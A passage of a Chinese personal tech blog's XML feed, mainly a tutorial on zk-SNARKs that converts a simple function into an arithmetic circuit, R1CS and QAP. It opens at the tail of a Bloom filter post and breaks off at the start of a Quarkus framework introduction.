1880–1888</code>中提出的过滤器中引入了一种基于可变增量的通用方法，显著降低了计数布隆过滤器及其变体的错误率，且仍然支持删除操作。不同的是插入元素时将递增一个哈希变量增量而不是一个单位增量，在查询元素时需要考虑计数器值的正确性，而不仅仅是数值。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Bloom
Filter（布隆过滤器）是一种空间利用很高的数据结构，使用一个数据来表示一个集合，用于判断一个元素是否存在于这个集合中。但是也有妥协：在判断一个元素是否属于该集合时有可能会误判(false
positive)，故不适合于&quot;零错误&quot;的场景，在能够容忍低错误率的场合下，可以通过极少的错误来换取较高的存储空间利用率。google的Guava中就有&lt;code&gt;BloomFilter&lt;/code&gt;这个类。&lt;/p&gt;
&lt;p&gt;一个比较常见的应用是缓解Redis等缓存中缓存击穿的问题。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/tags/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>zk-SNARKs简洁的非交互式零知识证明学习(一)</title>
    <link href="https://lzwgiter.github.io/posts/85e98ef0.html"/>
    <id>https://lzwgiter.github.io/posts/85e98ef0.html</id>
    <published>2021-08-25T00:25:26.000Z</published>
    <updated>2023-03-29T16:05:56.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>zk-SNARKs即"<strong>zero knowledge Succinct Non-interactive Argumentof Knowledge</strong>"，第一次见到是在ZCash的介绍里<code>Zcash is the first widespread application of zk-SNARKs, a novel form of zero-knowledge cryptography. ...</code>，他给出了<strong>简洁</strong>的<strong>非交互式零知识证明</strong>的办法，属于零知识证明的一种。</p><p>zk-SNARKs的第一个应用就是Zcash，可以做到毫秒级的验证效果，但是产生这个证明的过程较为复杂。这篇开始学习一下流程。大致上流程如下：</p><p><strong>Computation计算问题 -&gt; Arithmetic Circuit代数电路 -&gt;R1CS -&gt; QAP -&gt; zk-SNARK</strong></p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/zk-snarks.jpg" style="zoom: 80%;" /></p></blockquote><span id="more"></span><h1 id="基本概念">基本概念</h1><h2 id="什么是零知识证明">什么是零知识证明</h2><p>一句话就可以说明了：</p><blockquote><p>“Zero-knowledge” proofs allow one party (the prover) to prove toanother (the verifier) that a statement is true, without revealing anyinformation beyond the validity of the statement itself. For example,given the hash of a random number, the prover could convince theverifier that there indeed exists a number with this hash value, withoutrevealing what it is.</p></blockquote><p>即实现在不泄露真实信息的情况下证明这个我确实拥有这个信息，比如上面提到的，我可以提供给你哈希值供校验，而无需提供秘密信息本身。</p><h2 id="什么是zk-snarks">什么是zk-SNARKs？</h2><p>zk-SNARKs全称是<code>Zero-knowledge Succinct Non-interactive Argument of Knowledge</code>，名字挺长的，我们分开来看一下都包含了哪些主体：</p><ul><li>Zero-knowledge：即零知识证明，zk-SNARKs属于零知识证明的一种</li><li>Succinct：意为简洁的，zk-SNARKs的证明耗时为毫秒级，且证明的大小也仅为几百个字节</li><li>Non-interactive：即非交互式的，而传统的零知识证明，证明者<code>prover</code>和验证者<code>vervifier</code>需要来回的交互，效率较低。zk-SNARKs属于非交互式的零知识证明，你只需要给验证者提供证明，正确与否之后的操作验证者会自行执行，不会有交互反馈。</li><li>Argument ofKnowledge：<strong>这个很多人都没有提到，官网也说没必要深入探讨，但是这里还是说一下。</strong>零知识证明是proofof knowledge，保证了一个假的prover不能成功证明一个错的结论，而Argumentofknowledge在这个保证上加了一个条件--只针对计算有界的provers(computationallybounded provers)。</li></ul><h2id="为什么用zk-snarks以及future-application">为什么用zk-SNARKs以及FutureApplication？</h2><p>所以这个东西它<strong>用起来</strong>效率比较高，<code>不过目前来看证明的实现比较复杂，产生证明效率较低，离实际应用还有一段距离[1]</code>。因为属于计算密集型，所以对很多应用不够友好，官方也叙述了这一缺点以及表示正在改进：</p><blockquote><p>Theoretically, you can use a zk-SNARK to verify any relation withoutdisclosing inputs or leaking information.—<code>Generating proofs for complex functions is still too computationally intensive to be practical for many applications.</code>but the <a href="https://z.cash/team">Zcash team</a> is pushing theboundaries for optimizing zk-SNARKs, and is already breaking new groundwith more efficient implementations.</p></blockquote><p>官方指出zk-SNARKs可以作为一个组件添加到现存的区块链技术中，称为<ahref="https://electriccoin.co/blog/zsl/">ZSL</a>(Zero-knowledge SecurityLayer)。</p><p>此外，zk-SNARKs在整个代数电路的运算过程中都是在椭圆曲线上的，且依赖于<strong>配对密码学(pairing-basedcryptography)</strong>，关于配对密码学的概念、可使用的编程依赖库(比如jpbc)可以参考我兄弟的文章：<ahref="https://blank-vax.github.io/2021/07/05/基于配对的密码学——基础知识及JPBC库/">B1ank(blank-vax.github.io) - 基于配对的密码学-基础知识及JPBC库</a>。</p><p>[1]李佩丽, 徐海霞. 区块链用户匿名与可追踪技术[J]. 电子与信息学报,2020, 42.</p><h1 id="计算步骤概述">计算步骤概述</h1><p>这里直接用一张图来总结，这张图包含了本篇文章的全部内容，具体的计算细节你可以对照我的文章来看。图片来源:<ahref="https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501">zk-snark之R1CS-&gt;QAP_江小白希的博客-CSDN博客</a></p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/20191029203605385.jpg" alt="20191029203605385"  /></p><p>下面具体叙述一下重要概念以及计算步骤。</p><h1 id="计算步骤">计算步骤</h1><p>这里以V神的教程为基础，更为详尽的在计算方面复现一下整体思路流程。</p><p>大体上来说我们的步骤如下：</p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/image-20210827202233893.png" alt="image-20210827202233893" style="zoom:80%;" /></p><p>官方给出的例子是这样的一个函数，类似python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">qeval</span>(<span class="params">x</span>)：</span><br><span class="line">    y = x ** <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> x + y + <span class="number">5</span></span><br></pre></td></tr></table></figure><p>接下来我们像上面那个图一样，将这个函数变为zk-SNARKs。</p><h2id="计算问题转化为代数电路the-arithmetic-circuits">计算问题转化为代数电路(TheArithmetic Circuits)</h2><h3 id="代数电路简介以及重点说明">代数电路简介以及重点说明</h3><blockquote><p>电路(Circuits)可以有效的来表示计算模型。一个电路的主体是<strong>线路(wires)</strong>和<strong>门(gate)</strong>，其中线路携带值，而门则代表对这些值所进行的操作。</p></blockquote><p>最简单好理解的就是逻辑电路：</p><ul><li>值只能为0或1</li><li>门包含与(AND)、或(OR)、非(NOT)</li></ul><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/image-20210827213724273.png" alt="image-20210827213724273"  /></p><p>而在zk-SNARKs的计算过程中，我们使用代数电路(Arithmeticcircuits)，一个例子如上图，实际上就是一个代数电路的图，它是一种有向无环图，流动方向始终从输入到输出，<strong>其中的门实际上包括的就是模运算中的加减乘除(modularaddtion andmultiplication)。使用模运算是因为整个运算都是在椭圆曲线上完成的。</strong></p><p>对于上图中的等式：<spanclass="math inline">\(a^2+ab-b=n\)</span>，实际上，可以将这个式子化为两个门，我们用var等变量名来代替：<span class="math display">\[\begin{align}var_3 = var_1 * var_2 \tag{1}\\var_6 = var_4 + var_5 \tag{2}\end{align}\]</span></p><p>观察一下就可以发现a^2和ab实际上就是1式的类型，加减则是2式的类型，我们可以用伪代码来表示：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tmp_1 = a * a</span><br><span class="line">tmp_2 = a * b</span><br><span class="line">tmp_3 = tmp_1 + tmp_2</span><br><span class="line">tmp_4 = tmp_3 - b</span><br></pre></td></tr></table></figure><p>最后我们的n值就保存在了tmp_4中。</p><p>在零知识中，该电路实际上就相当于Verifier，对于一个正确的proof，prover输入有效的witness，电路应该返回1。</p><h3 id="计算问题展开-flatttening">计算问题展开 (Flatttening)</h3><blockquote><p>这是第一步，我们要将原始的功能代码转变为基本算术单元，就像上一节那样。</p></blockquote><p>这里再看一下源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">qeval</span>(<span class="params">x</span>)：</span><br><span class="line">    y = x ** <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> x + y + <span class="number">5</span>// 即返回c</span><br></pre></td></tr></table></figure><p>这里有两种类型：加法和乘法，或者更为抽象一点，只有两种类型，也就是<strong>两种门</strong></p><ul><li>x = y，单纯的赋值</li><li>x = y (opt) z，其中opt代表任意的一次计算，可能为加减乘除</li></ul><p>所以我们进行<strong>展开</strong>：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sym_1 = x * x</span><br><span class="line">y = sym_1 * x// y = x**3</span><br><span class="line">sym_2 = y + x   // x^3 + x</span><br><span class="line">~out = sym_2 + 5 // x^3 + x + 5，完成计算</span><br></pre></td></tr></table></figure><p>最后我们的输出就是<code>~out</code>变量了。其实思路很简单吧？到这里我们就生成了两种门。</p><p>展开后的式子其实计算结果是一样的，好比我们x取3，那么最终return就是35，对于上面的式子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = 3</span><br><span class="line">sym_1 = 9</span><br><span class="line">y = 27</span><br><span class="line">sym_2 = 30</span><br><span class="line">~out = 35 -- 最终结果=</span><br></pre></td></tr></table></figure><h2 id="r1csa-rank-1-constraint-system">R1CS(a rank-1 constraintsystem)</h2><h3 id="r1cs简介以及重点说明">R1CS简介以及重点说明</h3><p>上面也说到了，我们首先要将待计算的式子简化为一系列的基本计算，构成代数电路，其中每一条线都代表这一个数值的传递，门则代表一次基本计算。那么下一步就是生成<strong>一系列的约束(Constraints)，这些约束可以断言(assert)一个门计算已经正确执行，且内部的赋值是一致的。</strong>这样的约束保证了门计算的准确性，所以我们需要给每一个门都生成一个<code>rank-1</code>的约束，<code>rank-1</code>我也不知道怎么理解，姑且认为是一条约束吧。所有这些约束条件集合起来就是R1CS(<code>A Rank-1 Constraint System</code>)。</p><p>具体有什么作用呢？<strong>如果一个假的prover向verifier进行证明的时候，由于他不知道正确的witness，并拿了个假的输出来糊弄verifier，因为他的输入就是错的，所以在代数电路中运算的时候，某一个门的输出就会导致该门的约束无效。</strong></p><p>那么问题来了，实际中一个代数过于复杂怎么办？一个个去验证岂不是很花时间？所以<code>zk-SNARKs</code>将所有这些约束都封装到了三维向量中，以此来同时验证整个约束集。这三个多项式向量下一小节会看到，它们就是<strong>A、B、C</strong>。</p><h3 id="门运算变换为r1cs">门运算变换为R1CS</h3><p>上面说了<code>zk-SNARKs</code>将R1CS整理为了一个三维向量，其中每一个门我们也一样用一个三维向量来描述：<code>(a, b, c)</code>，最终所有门三维向量的组合我们用<code>(A, B, C)</code>表示，其中的A由所有的a组成，另外两个也类似。</p><p>那为啥要用三元组呢？<strong>因为从上面我们简化后的计算来看，我们右边都最多只有两个数，并进行赋值，所以用三元组就可以表示这个等式了</strong>。</p><p>那么这个三维向量的a、b、c有什么关系呢？我们首先定义这个R1CS的解是<code>s</code>，则有如下关系：<span class="math display">\[\begin{align}(s·a) * (s·b) - s·c = 0 \\or \\(s·a) * (s·b) = s·c\end{align}\]</span></p><p>根据我们简化后的运算，我们可以看到需要如下几个变量，其中<code>~one</code>是常量1，用来得到我们需要的常量，比如等式中的5。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~one、x、~out、sym_1、y、sym_2] // 下标从0开始，可以看做一个数组</span><br></pre></td></tr></table></figure><p>那么对于第一个门:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sym_1 = x * x</span><br></pre></td></tr></table></figure><p>它的三元组如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [0, 1 ,0, 0, 0, 0] // 我们可以看到第二个元素也就是下标1的位置为1，代表输入x</span><br><span class="line">b = [0, 1, 0, 0, 0, 0] // 输入x</span><br><span class="line">c = [0, 0, 0, 1, 0, 0] // 代表得到sym_1，而sym_1的下标是3</span><br></pre></td></tr></table></figure><p>是不是发现有点像往内存单元里面填数据的感觉？<strong>对号入座</strong>，那么剩下三个门及其三元组如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// y = sym_1 * x</span><br><span class="line">a = [0, 0, 0, 1, 0, 0] // 输入sym_1</span><br><span class="line">b = [0, 1, 0, 0, 0, 0] // 输入x</span><br><span class="line">c = [0, 0, 0, 0, 1, 0] // y = sym_1 * x</span><br><span class="line"></span><br><span class="line">// sym_2 = y + x</span><br><span class="line">a = [0, 1, 0, 0, 1, 0] // 输入y + x</span><br><span class="line">b = [1, 0, 0, 0, 0, 0] // 相当于1*y + 1*x，即x + y</span><br><span class="line">c = [0, 0, 0, 0, 0, 1] // sym_2 = y + x</span><br><span class="line"></span><br><span class="line">// ~out = sym_2 + 5</span><br><span class="line">a = [5, 0, 0, 0, 0, 1] // 输入sym_2 + 5</span><br><span class="line">b = [1, 0, 0, 0, 0, 0] // 相当于1*sym_2 + 1*5，即sym_2 + 5</span><br><span class="line">c = [0, 0, 1, 0, 0, 0] // ~out = sym_2 + 5</span><br></pre></td></tr></table></figure><p><strong>然后我们把4个门的a放到一起就是A，剩下的一样</strong>。比如对于有k个门的R1CS，它的A：<span class="math display">\[A = \begin{bmatrix}    A_1[1]&amp;A_1[2]&amp;... &amp;A_1[n]\\    &amp;...\\    A_k[1]&amp;A_k[2]&amp;... &amp;A_k[n]\\    \end{bmatrix}\]</span> 所以我们就得到了最终的R1CS： <span class="math display">\[A = \begin{bmatrix}        0, &amp;1, &amp;0, &amp;0, &amp;0, &amp;0\\        0, &amp;0, &amp;0, &amp;1, &amp;0, &amp;0\\        0, &amp;1, &amp;0, &amp;0, &amp;1, &amp;0\\        5, &amp;0, &amp;0, &amp;0, &amp;0, &amp;1    \end{bmatrix}B = \begin{bmatrix}        0, &amp;1, &amp;0, &amp;0, &amp;0, &amp;0\\        0, &amp;1, &amp;0, &amp;0, &amp;0, &amp;0\\        1, &amp;0, &amp;0, &amp;0, &amp;0, &amp;0\\        1, &amp;0, &amp;0, &amp;0, &amp;0, &amp;0    \end{bmatrix}\\C = \begin{bmatrix}        0, &amp;0, &amp;0, &amp;1, &amp;0, &amp;0\\        0, &amp;0, &amp;0, &amp;0, &amp;1, &amp;0\\        0, &amp;0, &amp;0, &amp;0, &amp;0, &amp;1\\        0, &amp;0, &amp;1, &amp;0, &amp;0, &amp;0    \end{bmatrix}\]</span></p><h2 id="qapquadratic-arithmetic-program">QAP(quadratic arithmeticprogram)</h2><h3 id="概念">概念</h3><p><code>Quadratic Arithmetic Program</code>简称QAP，我也不知道叫啥，应该是二次代数规划吧emmmm。他的作用如下：</p><blockquote><p>a way of representing any computational problem with a polynomialequation that is much more amenable to various forms of mathematicaltrickery.</p></blockquote><p>即他可以用多项式等式来表示一个可计算的问题，更便于数学计算。那为啥我们要把R1CS转变为QAP呢？这俩啥区别？</p><p>实际上QAP和R1CS的逻辑是一样的，区别在于将向量的点积运算转变为了多项式。下面阐述一下过程。</p><h3 id="r1cs计算qap">R1CS计算QAP</h3><p>在上一章中我们得到了多项式<code>x^3 + x + 5</code>的R1CS，这个R1CS的内容Prover和Verifier双方都知道。接下来我们来构造QAP。</p><ul><li>我们都有什么？我们有四个门的对应的(a, b,c)三个向量，其中a，b，c长度均为6</li><li>我们要做什么？我们要把这一共四个门的、每个门三组、每组包含长度为6的三个向量的数据，依旧转变为(A，B，C)，但是区别是A，B，C每个组包含了长度为4的6个向量，即6*4，而不是R1CS那样的4x6</li></ul><p>那我们怎么转换呢？这里要用到一个定理：拉格朗日插值法，这里很快过一下：</p><blockquote><p>拉格朗日插值法(Lagrange InterpolationPolynomial)指可以找到一个多项式，该多项式恰好在各个观测的点取到观测值，说人话就是找到一条过指定的一些点的一条曲线。</p></blockquote><p>公式内容如下： <span class="math display">\[\begin{align}现有点(x_0,y_0),(x_1, y_1),...,(x_{n-1},y_{n-1}),设D_n=\{0,...,n-1\}，B_k=\{k|k \ne i,i \inD_n\}。\\对于每一个x存在一个符合观测值的多项式p_k(x)，使p_k(x) = \prod\limits_{i \inB_k}\frac{x-x_i}{x_k-x_i}。\\则满足上述所有观测点的f(x)=\sum_{j=0}^{n-1}y_ip_j(x)\\end{align}\]</span></p><p>看着比较复杂，实际上比较好记，<strong>即对于每一个点的多项式，它是这么来的：用未知数x减去其他点的x的乘积除以该点x减其他点的x的乘积，最后乘一个该点y，最后的最后把所有点多项式一加就可以了。</strong>给一个例子吧，过点(1,3)，(2, 2)，(3, 4)的函数：</p><p><span class="math display">\[f(x) = \frac{(x-2)(x-3)}{(1-2)(1-3)}\cdot3 +\frac{(x-1)(x-3)}{(2-1)(2-3)}\cdot2 +\frac{(x-1)(x-2)}{(3-1)(3-2)}\cdot4=\frac{3}{2}x^2-\frac{11}{2}x+7\]</span></p><p>该算法的时间复杂度为<code>O(n^3)</code>其中n代表点的个数，而每个点计算多项式需要<code>O(n^2)</code>的时间复杂度，我们可以利用快速傅里叶变化来降低时间复杂度，因为实际中会有成千个门。然后我们再来看怎么转换我们的R1CS，我们以A矩阵为例，B，C都要进行相同的操作。</p><p><strong>这里重点来了，很多网上的文章都没有说这一部分是怎么来的，包括最开始那张总结全部流程的图，A是啥？可以看成矩阵，那我们要使用拉格朗日插值法得有点啊，纳闷了点哪来的啊？官网描述的我反正来来回回看了三四遍没看懂啥意思：</strong></p><blockquote><p>What we are going to do is take the first value out of every avector, use Lagrange interpolation to make a polynomial out ofthat(where evaluating the polynomial at <code>i</code> gets you thefirst value of the ith <code>a</code> vector)</p></blockquote><p>然后<strong>从最后这句话</strong>自己试出来结论了，首先我们取A矩阵的第一列作为纵坐标，而横坐标则是行数，上面我们得到的A：<span class="math display">\[A = \begin{bmatrix}        0, &amp;1, &amp;0, &amp;0, &amp;0, &amp;0\\        0, &amp;0, &amp;0, &amp;1, &amp;0, &amp;0\\        0, &amp;1, &amp;0, &amp;0, &amp;1, &amp;0\\        5, &amp;0, &amp;0, &amp;0, &amp;0, &amp;1    \end{bmatrix}\]</span></p><p>则四个点分别为：(1, 0)，(2, 0)，(3, 0)，(4,5)，然后对这四个点进行拉格朗日插值法得到多项式：</p><p><span class="math display">\[f(x)=\frac{(x-1)(x-2)(x-3)}{(4-1)(4-2)(4-3)}\cdot5=\frac{5}{6}x^3-5x^2+\frac{55}{6}x-5\]</span>然后我们把这个多项式转成行向量，即从左到右依次是低次项到高次项的系数，实际上就是多项式的矩阵化。</p><p>得(也就是V神的结果)，B，C同理：</p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/image-20210827194403264.png" alt="image-20210827194403264" style="zoom:80%;" /></p><p>上述的数据就是QAP了，当然上述的过程只需要执行一次，一旦QAP参数生成后，就可以复用了。</p><p>假如x取1，那么就可以得到如下结果(就是多项式赋值):</p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/image-20210827194711274.png" alt="image-20210827194711274" style="zoom:80%;" /></p><p>这恰好和我们R1CS的A、B、C的第一行行向量对应，这也就是作者说的那句：&gt; where evaluating the polynomial at <code>i</code> gets you thefirst value of the ith <code>a</code> vector)</p><p>你x取多少，A算出来的就是R1CS中第x个a，你比如x取<strong>1</strong>上面算出来是[0,1, 0, 0, 0,0]，这不就是我们R1CS的第1行吗？不就是<strong>第一个门的a</strong>吗？</p><h3 id="qap正确性检查">QAP正确性检查</h3><p>好了到这里其实本文主体就结束了，下来我们验证一下QAP，这样我们就不需要去验证我们的R1CS了。在验证过程中，如果每一个门(x=1,2,3,4)他的多项式计算出来是0，那就对了，否则就不对，比如<code>y = x * sym_1</code>结果<code>x=2和sym_1=2，y=5</code>，那显然输入输出是不匹配的。</p><p>具体计算方法呢？</p><p><span class="math display">\[h=\frac{(A \cdot s)*(B \cdot s) - C \cdot s}{Z}, Z=(x - 1)*(x - 2)*(x -3)..., t=(A \cdot s)*(B \cdot s) - C \cdot s\]</span></p><p>其中Z是一个在任意门x都为零的多项式，即有k个门，则Z就乘到(x-k)。</p><p>所以有：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A . s = [43.0, -73.333, 38.5, -5.166]</span><br><span class="line">B . s = [-3.0, 10.333, -5.0, 0.666]</span><br><span class="line">C . s = [-41.0, 71.666, -24.5, 2.833]</span><br></pre></td></tr></table></figure><p>这里我们就需要多项式矩阵化的乘法规则了，这个属于单另的知识，包括怎么矩阵化后进行多项式的乘法和除法，这部分请参考学习：<ahref="https://zhuanlan.zhihu.com/p/58665745?utm_source=qq&amp;utm_medium=social&amp;utm_oi=894491492633182208">多项式的矩阵表示及乘法运算- 知乎 (zhihu.com)</a>。</p><p>所以<code>(A·s)*(B·s)-C·s</code>：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t=[-88.0, 592.666, -1063.777, 805.833, -294.777, 51.5, -3.444]</span><br></pre></td></tr></table></figure><p>又因为<code>Z=(x - 1)*(x - 2)*(x - 3)(x - 4)</code>，所以</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Z = [24, -50, 35, -10, 1]</span><br></pre></td></tr></table></figure><p>我们得到最终的h，且该结果无余数</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = t / Z = [-3.666, 17.055, -3.444]</span><br></pre></td></tr></table></figure><p>还记得前面说过R1CS的解(solution)是<code>s</code>吗，对于x取3，记不记得我们的s是[1,3, 35, 9, 27,30]？如果说我们的solution是假的，比如把最后的30换成31，这就会导致当x=3的时候t算出来不是0(是-1)，且t/Z的结果也会有余数(结果是<code>[-5.0, 8.833, -4.5, 0.666]</code>)</p><h1 id="后续内容安排">后续内容安排</h1><p>这篇主要介绍了zk-SNARKs的基础概念，以及是怎么把计算问题转换为R1CS和QAP的、如何验证QAP，但是没有涉及协议本身的验证过程、目前可使用的库等，下一篇将详细讨论这些内容。</p><h1 id="参考学习">参考学习</h1><p>官方zcash中zk-SNARKs介绍：<ahref="https://z.cash/technology/zksnarks/">What are zk-SNARKs? |Zcash</a></p><p>官方V神教程系列，建议按顺序学习</p><ul><li><ahref="https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649">QuadraticArithmetic Programs: from Zero to Hero | by Vitalik Buterin |Medium</a></li><li><ahref="https://medium.com/@VitalikButerin/exploring-elliptic-curve-pairings-c73c1864e627">ExploringElliptic Curve Pairings | by Vitalik Buterin | Medium</a></li><li><ahref="https://medium.com/@VitalikButerin/zk-snarks-under-the-hood-b33151a013f6">Zk-SNARKs:Under the Hood. This is the third part of a series of… | by VitalikButerin | Medium</a></li></ul><p>其他参考：</p><p>这张流程图非常的赞：<ahref="https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501">zk-snark之R1CS-&gt;QAP_江小白希的博客-CSDN博客</a></p><p><ahref="https://www.cnblogs.com/linguanh/p/10892344.html">详细讲解：零知识证明之 zk-SNARK 开篇 - 指尖下的幽灵 - 博客园 (cnblogs.com)</a></p><p><ahref="https://zhuanlan.zhihu.com/p/58665745?utm_source=qq&amp;utm_medium=social&amp;utm_oi=894491492633182208">多项式的矩阵表示及乘法运算- 知乎 (zhihu.com)</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;zk-SNARKs即&quot;&lt;strong&gt;zero knowledge Succinct Non-interactive Argument
of Knowledge&lt;/strong&gt;&quot;，第一次见到是在ZCash的介绍里
&lt;code&gt;Zcash is the first widespread application of zk-SNARKs, a novel form of zero-knowledge cryptography. ...&lt;/code&gt;，他给出了&lt;strong&gt;简洁&lt;/strong&gt;的&lt;strong&gt;非交互式零知识证明&lt;/strong&gt;的办法，属于零知识证明的一种。&lt;/p&gt;
&lt;p&gt;zk-SNARKs的第一个应用就是Zcash，可以做到毫秒级的验证效果，但是产生这个证明的过程较为复杂。这篇开始学习一下流程。大致上流程如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Computation计算问题 -&amp;gt; Arithmetic Circuit代数电路 -&amp;gt;
R1CS -&amp;gt; QAP -&amp;gt; zk-SNARK&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/zk-snarks.jpg&quot; style=&quot;zoom: 80%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="密码学" scheme="https://lzwgiter.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="区块链技术" scheme="https://lzwgiter.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="密码学" scheme="https://lzwgiter.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Quarkus学习（一）概述以及编写REST服务</title>
    <link href="https://lzwgiter.github.io/posts/a8e0eb2d.html"/>
    <id>https://lzwgiter.github.io/posts/a8e0eb2d.html</id>
    <published>2021-08-22T05:48:57.000Z</published>
    <updated>2023-08-17T03:22:35.171Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Quarkus -- A Kubernetes Native Java stack tailored forOpenJDK HotSpot and GraalVM, crafted from the best of breed Javalibraries and standards.</strong></p><p>该框架定义为Kubernetes原生框架，可以很好的解决Serverless架构下资源占用大、冷启动慢等问题，实际效果还是挺惊艳的。这一篇开始学习Quarkus框架，本篇内容如下：</p><ul><li>介绍基本概念</li><li>学习写简单的RESTful项目</li><li>学习构建可执行文件以及构建Docker镜像</li></ul><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/55c78ef5546cbae1f7b88dc2241019c7.jpeg" style="zoom:80%;" /></p></blockquote><span id="more"></span><h1 id="quarkus介绍">Quarkus介绍</h1><h2 id="什么是quarkus">什么是Quarkus?</h2><p>官方对Quarkus的介绍是<code>A Kubernetes Native Java stack tailored for OpenJDK HotSpot and GraalVM, crafted from the best of breed Java libraries and standards.</code></p><p>所以我们可以管窥它的特点：</p><ul><li>Kubernetes原生，即对容器化技术友好</li><li>底层虚拟机可以使用HotSpot或者GraalVM</li><li>集成了现存的很多优秀的Java库和标准</li></ul><h2 id="为什么要用quarkus">为什么要用Quarkus？</h2><p>根据2020年NewRelic调查，在云服务领域，Java只占了6%的使用，具体如图：(图片来源：<ahref="https://opensource.com/downloads/java-serverless-ebook">A guide toJava serverless functions | Opensource.com</a>)</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823083606274.png" /></p><p>那么造成这个的原因是什么？<strong>很难在如Kubernetes的容器平台中优化Java的应用程序</strong>，我们可以使用NodeJs、Go语言进行一个对比，看看同样资源下支持的应用程序数目：</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823083834106.png"/></p><p>由于需要给每一个JVM堆分配内存，导致了Java应用程序较高的内存开销，相比与其他语言，<strong>尤其是内存开极小的GO</strong>，那基本上没得看，所以Go在云服务领域很流行。</p><h2 id="为什么不继续用spring">为什么不继续用Spring？</h2><p>上一节的原因导致了直接上Spring不是很合适，<strong>虽然，SpringFunction支持使用java.util.function包来编写反应式函数，Spring也支持你把应用程序部署到Serverless平台上去，比如Kubeless、ApacheOpenWhisk、Fission、ProjectRiff等。但是却也造成了包括上一节的问题：</strong></p><ul><li>较大的内存开销</li><li>冷启动慢</li><li>响应时间缓慢</li></ul><p>上述的问题如果放到不是Serverless的平台上，比如Kubernetes上，只会更严重。而对于Quarkus框架，官方宣称的开销如下：</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/compare.png" /></p><p>可以看到不管是搭配HotSpot或者GraalVM，这个开销都要小得多得多。<strong>尤其是搭配GraalVM，它和HotSpot一样，属于JVM的一种，典型的GraalVM就是<ahref="https://github.com/graalvm/graalvm-ce-builds/releases">graalvm/graalvm-ce-builds</a>，或者<ahref="https://github.com/graalvm/mandrel/releases">graalvm/mandrel(github.com)</a></strong>。</p><h1 